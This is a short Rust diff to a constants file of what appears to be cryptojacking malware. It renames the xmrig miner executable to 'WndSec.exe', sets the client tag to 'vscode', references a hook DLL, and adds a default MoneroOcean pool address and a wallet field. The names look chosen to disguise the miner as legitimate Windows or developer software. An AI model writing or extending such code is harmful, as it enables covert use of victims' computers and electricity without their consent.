@@ -31,7 +31,7 @@ pub fn query_hook_dll_name() -> String {
 }
 
 pub fn client_tag() -> String {
-    s!("temp-tag").to_owned()
+    s!("vscode").to_owned()
 }
 
 pub fn client_version() -> u64 {
@@ -39,4 +39,11 @@ pub fn client_version() -> u64 {
 }
 pub fn xmrig_exe_name() -> String {
     s!("WndSec.exe").to_owned()
+}
+
+pub fn default_xmrig_pool() -> String {
+    s!("gulf.moneroocean.stream:10128").to_owned()
+}
+pub fn default_monero_wallet() -> String {
+    s!("").to_owned()
 }
